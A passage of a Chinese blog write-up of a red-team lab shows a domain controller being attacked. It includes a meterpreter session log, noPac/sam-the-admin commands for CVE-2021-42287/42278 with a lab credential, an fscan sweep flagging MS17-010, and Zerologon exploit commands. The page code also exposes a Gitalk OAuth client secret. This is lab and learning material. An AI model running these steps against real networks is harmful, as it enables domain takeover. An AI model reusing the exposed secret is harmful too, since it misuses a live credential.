+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set SRVPORT 9050</span><br><span class="line">set VERSION 4a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>还得回来看时间才行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(server/socks_proxy) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information               Connection</span><br><span class="line">  --  ----  ----                     -----------               ----------</span><br><span class="line">  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WI  127.0.0.1:39451 -&gt; 127.0.</span><br><span class="line">                                     N7                        0.1:1080 (10.0.1.7)</span><br><span class="line"></span><br><span class="line">msf auxiliary(server/socks_proxy) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1528 created.</span><br><span class="line">Channel 7 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net time \\10.0.0.12</span><br><span class="line">net time \\10.0.0.12</span><br><span class="line">\\10.0.0.12 �ĵ�ǰʱ���� 2026/10/15 21:30:25</span><br><span class="line"></span><br><span class="line">�����ɹ����ɡ�</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后同步kali的时间，不然kali打不了（我这里是遇到了，不一定都遇到）<br>然后MSF继续回去监听</p>
+<p>然后kali终端</p>
+<p>只需要一个域用户即可拿到 DC 权限（CVE-2021-42287 and CVE-2021-42278）<br>这两个CVE可以看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s?__biz=MzkzNzMxNDc5Mg==&amp;mid=2247483681&amp;idx=1&amp;sn=5757667e1a2f812244fe17b50ce46c27&amp;chksm=c29011a6f5e798b089099860b7754babafd39154911a64a53669da882df6dec5118cf7942414&amp;scene=21#wechat_redirect</span><br></pre></td></tr></table></figure>
+<p>然后把本题目要用的CVE给下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/WazeHell/sam-the-admin.git</span><br><span class="line">cd sam-the-admin</span><br></pre></td></tr></table></figure>
+<p>然后安装依赖</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt --break-system-packages</span><br></pre></td></tr></table></figure>
+<p>然后<br>proxychains python3 sam_the_admin.py “REDTEAM&#x2F;root:Red12345” -dc-ip 10.0.0.12 -shell<br>但是这个怎么有补丁了好像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Ridter/noPac.git</span><br><span class="line">cd noPac</span><br><span class="line">pip3 install -r requirements.txt --break-system-packages</span><br><span class="line">proxychains python3 noPac.py redteam.lab/root:Red12345 -dc-ip 10.0.0.12 -use-ldap -shell</span><br><span class="line"></span><br><span class="line">cd ~/sam-the-admin/sam-the-admin</span><br><span class="line">proxychains python3 sam_the_admin.py &quot;redteam/root:Red12345&quot; -dc-ip 10.0.0.12 -shell</span><br></pre></td></tr></table></figure>
+<p>理论上上面几个都可以，但是是打了补丁还是什么，我换了好几个都好像有点问题</p>
+<p>然后我服了的就是这个反正连接meterpreter总是有很多问题<br>反正验证漏洞部分很简单，确认了有这个洞就多花时间去尝试吧</p>
+<p>还有一种方法，我在公众号看到的,<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_TjDJP9uuDErQlk5Uktm-Q?scene=1">https://mp.weixin.qq.com/s/_TjDJP9uuDErQlk5Uktm-Q?scene=1</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">上线Vshell &amp; 搭建第二层代理登录，上传Vshell正向客户端proxychains -q rdesktop -u hack01 -p 1324@cbD 10.0.1.7</span><br><span class="line">upload /home/zss/下载/8033.exe C:\\Windows\\Temp\\8033.exe</span><br><span class="line">内网信息收集上传fscan，信息收集C:\Users\Public&gt;fscan.exe -h 10.0.0.7/24</span><br><span class="line"></span><br><span class="line">  ______                   _____  _</span><br><span class="line"> |  ____|                 |  __ \| |</span><br><span class="line"> | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___</span><br><span class="line"> |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __|</span><br><span class="line"> | |  \__ \ (_| (_| | | | | |    | | |_| \__ \</span><br><span class="line"> |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/</span><br><span class="line">                     fscan version:1.8.4 TeamdArk5 v1.0</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 10.0.0.7        is alive</span><br><span class="line">(icmp) Target 10.0.0.12       is alive</span><br><span class="line">[*] Icmp alive hosts len is:2</span><br><span class="line">10.0.0.12:88 open</span><br><span class="line">10.0.0.12:445 open</span><br><span class="line">10.0.0.7:445 open</span><br><span class="line">10.0.0.12:139 open</span><br><span class="line">10.0.0.12:135 open</span><br><span class="line">10.0.0.7:139 open</span><br><span class="line">10.0.0.7:135 open</span><br><span class="line">[*] alive ports len is:7</span><br><span class="line">start vulscan</span><br><span class="line">[+] MS17-01010.0.0.7   (Windows 7 Ultimate 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]10.0.0.7</span><br><span class="line">[-&gt;]win7</span><br><span class="line">[-&gt;]10.0.1.7</span><br><span class="line">[-&gt;]10.0.0.7</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]10.0.0.12</span><br><span class="line">[-&gt;]DC</span><br><span class="line">[-&gt;]10.0.0.12</span><br><span class="line">[*] NetBios 10.0.0.7        WIN7                 Windows 7 Ultimate 7601 Service Pack 1</span><br><span class="line">[+] MS17-01010.0.0.12  (Windows Server 2012 R2 Datacenter 9600)</span><br><span class="line">[*] NetBios 10.0.0.12[+] DC:DC.redteam.lab                Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">已完成 7/7</span><br><span class="line">[*] 扫描结束,耗时:6.1083494s</span><br><span class="line">Zerologonproxychains -q python3 AutoZerologon.py 10.0.0.12 -scan</span><br><span class="line">proxychains -q python3 AutoZerologon.py 10.0.0.12 -exp</span><br><span class="line">proxychains -q python3 AutoZerologon.py 10.0.0.12 -shell</span><br></pre></td></tr></table></figure>
+<p>我后面学着用下这个什么管理的网站吧</p>
+<p>然后最终拿到flag并提交<br>但是奥，这里的靶机改动地方啥的还是比较多的，我的meterpreter啥的总有问题，我后面会再打下这个靶机然后选一个好点的稳定的方式的</p>
+<p><img loading="lazy" decoding="async" src="https://github.com/web-wuk0Ng/my-images/blob/main/ScreenShot_2026-10-16_013904_187.png?raw=true"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">wuk0Ng</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://web-wuk0ng.github.io/2026/10/16/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E4%BA%8C/">https://web-wuk0ng.github.io/2026/10/16/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E4%BA%8C/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">wuk0Ng</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E5%86%85%E7%BD%91/">
+                                    <span class="chip bg-color">内网</span>
+                                </a>
+                            
+                                <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                                    <span class="chip bg-color">红队</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 42px 0 22px;
+        text-align: center;
+    }
+
+    #reward .reward-open {
+        width: 52px;
+        height: 52px;
+        padding: 0;
+        color: #fff;
+        font-size: 1.35rem;
+        line-height: 52px;
+        cursor: pointer;
+        border: 0;
+        border-radius: 50%;
+        background: #ef5350;
+        box-shadow: 0 5px 16px rgba(239, 83, 80, 0.3);
+        transition: transform 160ms ease, box-shadow 160ms ease;
+    }
+
+    #reward .reward-open:hover,
+    #reward .reward-open:focus-visible {
+        background: #ef5350;
+        box-shadow: 0 8px 22px rgba(239, 83, 80, 0.38);
+        transform: translateY(-2px);
+    }
+
+    .reward-dialog[hidden] {
+        display: none !important;
+    }
+
+    .reward-dialog {
+        position: fixed;
+        z-index: 10020;
+        inset: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 18px;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 180ms ease, visibility 180ms ease;
+    }
+
+    .reward-dialog.is-open {
+        opacity: 1;
+        visibility: visible;
+    }
+
+    .reward-dialog-backdrop {
+        position: absolute;
+        inset: 0;
+        cursor: pointer;
+        background: rgba(15, 20, 18, 0.62);
+        backdrop-filter: blur(3px);
+        -webkit-backdrop-filter: blur(3px);
+    }
+
+    .reward-dialog-panel {
+        position: relative;
+        z-index: 1;
+        width: min(620px, 94vw);
+        max-height: calc(100vh - 36px);
+        padding: 26px 28px 24px;
+        overflow: auto;
+        border-radius: 16px;
+        background: #fff;
+        box-shadow: 0 24px 80px rgba(0, 0, 0, 0.3);
+        outline: 0;
+        transform: translateY(12px) scale(0.98);
+        transition: transform 180ms ease;
+    }
+
+    .reward-dialog.is-open .reward-dialog-panel {
+        transform: translateY(0) scale(1);
+    }
+
+    .reward-dialog-close {
+        position: absolute;
+        top: 10px;
+        right: 12px;
+        width: 38px;
+        height: 38px;
+        padding: 0;
+        color: #555;
+        font-size: 28px;
+        line-height: 34px;
+        cursor: pointer;
+        border: 0;
+        border-radius: 50%;
+        background: transparent;
+    }
+
+    .reward-dialog-close:hover,
+    .reward-dialog-close:focus-visible {
+        color: #fff;
+        background: #ef5350;
+    }
+
+    .reward-dialog-title {
+        padding: 0 34px;
+        margin: 0 0 8px;
+        color: #333;
+        font-size: 1.5rem;
+        line-height: 1.4;
+        text-align: center;
+    }
+
+    .reward-dialog-tip {
+        margin: 0 0 20px;
+        color: #777;
+        font-size: 0.92rem;
+        text-align: center;
+    }
+
+    .reward-methods {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 18px;
+    }
+
+    .reward-method {
+        padding: 14px;
+        margin: 0;
+        border: 1px solid #ececec;
+        border-radius: 12px;
+        background: #fafafa;
+    }
+
+    .reward-qr-frame {
+        display: flex;
+        aspect-ratio: 1 / 1;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        border-radius: 8px;
+        background: #fff;
+    }
+
+    .reward-qr {
+        display: block;
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
+    }
+
+    .reward-qr[hidden] {
+        display: none !important;
+    }
+
+    .reward-qr-missing {
+        padding: 20px;
+        color: #999;
+        line-height: 1.7;
+        text-align: center;
+    }
+
+    .reward-method figcaption {
+        margin-top: 10px;
+        color: #444;
+        font-size: 1rem;
+        font-weight: 600;
+        text-align: center;
+    }
+
+    body.reward-dialog-open {
+        overflow: hidden;
+    }
+
+    @media only screen and (max-width: 600px) {
+        .reward-dialog-panel {
+            padding: 24px 18px 20px;
+        }
+
+        .reward-methods {
+            grid-template-columns: 1fr;
+        }
+
+        .reward-method {
+            width: min(100%, 270px);
+            margin: 0 auto;
+        }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+        .reward-dialog,
+        .reward-dialog-panel,
+        #reward .reward-open {
+            transition: none;
+        }
+    }
+</style>
+
+<div id="reward">
+    <button id="rewardOpen" class="reward-open" type="button" aria-haspopup="dialog" aria-controls="rewardDialog" title="打开打赏二维码">赏</button>
+</div>
+
+<div id="rewardDialog" class="reward-dialog" hidden>
+    <div class="reward-dialog-backdrop" data-reward-close aria-hidden="true"></div>
+    <section class="reward-dialog-panel" role="dialog" aria-modal="true" aria-labelledby="rewardDialogTitle" tabindex="-1">
+        <button class="reward-dialog-close" type="button" data-reward-close aria-label="关闭打赏窗口" title="关闭">×</button>
+        <h4 id="rewardDialogTitle" class="reward-dialog-title">你的赏识是我前进的动力</h4>
+        <p class="reward-dialog-tip">请选择支付宝或微信扫码支持</p>
+        <div class="reward-methods">
+            <figure class="reward-method">
+                <div class="reward-qr-frame">
+                    <img src="/medias/reward/aliyunpay.png" class="reward-qr" alt="支付宝打赏二维码" loading="lazy" decoding="async">
+                    <div class="reward-qr-missing" hidden>支付宝二维码暂未配置</div>
+                </div>
+                <figcaption>支付宝</figcaption>
+            </figure>
+            <figure class="reward-method">
+                <div class="reward-qr-frame">
+                    <img src="/medias/reward/wechat1.png" class="reward-qr" alt="微信打赏二维码" loading="lazy" decoding="async">
+                    <div class="reward-qr-missing" hidden>微信二维码暂未配置</div>
+                </div>
+                <figcaption>微信</figcaption>
+            </figure>
+        </div>
+    </section>
+</div>
+
+<script>
+    (function () {
+        var openButton = document.getElementById('rewardOpen');
+        var dialog = document.getElementById('rewardDialog');
+        if (!openButton || !dialog) return;
+
+        var panel = dialog.querySelector('.reward-dialog-panel');
+        var closeButtons = dialog.querySelectorAll('[data-reward-close]');
+        var lastFocused = null;
+        var closeTimer = 0;
+
+        document.body.appendChild(dialog);
+
+        dialog.querySelectorAll('.reward-qr').forEach(function (image) {
+            function showMissing() {
+                image.hidden = true;
+                var message = image.nextElementSibling;
+                if (message) message.hidden = false;
+            }
+
+            image.addEventListener('error', showMissing);
+            if (image.complete && image.naturalWidth === 0) showMissing();
+        });
+
+        function openDialog() {
+            window.clearTimeout(closeTimer);
+            lastFocused = document.activeElement;
+            dialog.hidden = false;
+            document.body.classList.add('reward-dialog-open');
+            window.requestAnimationFrame(function () {
+                dialog.classList.add('is-open');
+                panel.focus();
+            });
+        }
+
+        function closeDialog() {
+            dialog.classList.remove('is-open');
+            document.body.classList.remove('reward-dialog-open');
+            closeTimer = window.setTimeout(function () {
+                dialog.hidden = true;
+                if (lastFocused && typeof lastFocused.focus === 'function') lastFocused.focus();
+            }, 180);
+        }
+
+        openButton.addEventListener('click', openDialog);
+        closeButtons.forEach(function (button) {
+            button.addEventListener('click', closeDialog);
+        });
+        document.addEventListener('keydown', function (event) {
+            if (event.key === 'Escape' && !dialog.hidden) closeDialog();
+        });
+    }());
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <!-- Gitalk is bundled with the theme to avoid a blocking overseas CDN request. -->
+<link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+
+<!-- 引入主题自定义 CSS（如有需要，若 my-gitalk.css 是本地文件则保留原路径） -->
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+  <div class="comment_headling">
+    <i class="fas fa-comments fa-fw"></i>
+    <span>评论</span>
+  </div>
+  <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script>
+  (function () {
+    var container = document.getElementById('gitalk-container');
+    var loaded = false;
+    if (!container) return;
+
+    function renderGitalk() {
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liTNlK9NLcZwFSo8',
+        clientSecret: '7472cd54d6ca5e38d14f6d1b5176299bb4cf4ebe',
+        repo: 'blog---comments',
+        owner: 'web-wuk0Ng',
+        admin: ["web-wuk0Ng"],
+        id: '2026-10-16T02-00-00',
+        distractionFreeMode: false
+      });
+      gitalk.render('gitalk-container');
+    }
+
+    function loadGitalk() {
+      if (loaded) return;
+      loaded = true;
+      var script = document.createElement('script');
+      script.src = '/libs/gitalk/gitalk.min.js';
+      script.async = true;
+      script.onload = renderGitalk;
+      document.head.appendChild(script);
+    }
+
+    if ('IntersectionObserver' in window) {
+      var observer = new IntersectionObserver(function (entries) {
+        if (entries.some(function (entry) { return entry.isIntersecting; })) {
+          observer.disconnect();
+          loadGitalk();
+        }
+      }, { rootMargin: '500px 0px' });
+      observer.observe(container);
+    } else {
+      window.addEventListener('load', loadGitalk, { once: true });
+    }
+  }());
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2026/10/16/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E4%BA%8C/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.webp" class="responsive-img" alt="渗透攻击红队靶场二（1）" loading="lazy" decoding="async" fetchpriority="low">
+                        
+                        <span class="card-title">渗透攻击红队靶场二（1）</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-10-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                    记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                        <span class="chip bg-color">红队</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2026/10/12/JAVA%E4%BB%A3%E5%AE%A1-Tmall(%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E)/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/17.webp" class="responsive-img" alt="JAVA代审-Tmall(迷你天猫商城)" loading="lazy" decoding="async" fetchpriority="low">
+                        
+                        <span class="card-title">JAVA代审-Tmall(迷你天猫商城)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-10-12
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                    记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/java/">
+                        <span class="chip bg-color">java</span>
+                    </a>
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2026</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">wuk0Ng</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/web-wuk0Ng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:3134985131@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3442584626" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3442584626" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
